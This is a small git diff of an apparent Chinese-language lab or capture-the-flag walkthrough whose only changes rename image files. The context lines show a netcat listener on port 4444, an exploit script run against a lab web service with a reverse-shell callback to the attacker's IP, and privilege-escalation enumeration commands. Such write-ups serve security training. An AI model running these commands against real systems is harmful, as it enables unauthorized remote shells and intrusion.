@@ -68,9 +68,9 @@ nc -lvnp 4444
 python3 51293.py -s 192.168.45.234 4444 -w http://192.168.225.22:3000/pdf -p url
 ```
 
-<figure><img src="../.gitbook/assets/11.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/11 (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/12.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/12 (1).png" alt=""><figcaption></figcaption></figure>
 
 ## 提升权限
 
@@ -85,7 +85,7 @@ find / -perm -u=s -type f 2>/dev/null
 sudo -l
 ```
 
-<figure><img src="../.gitbook/assets/13.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/13 (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../.gitbook/assets/14.png" alt=""><figcaption></figcaption></figure>
 
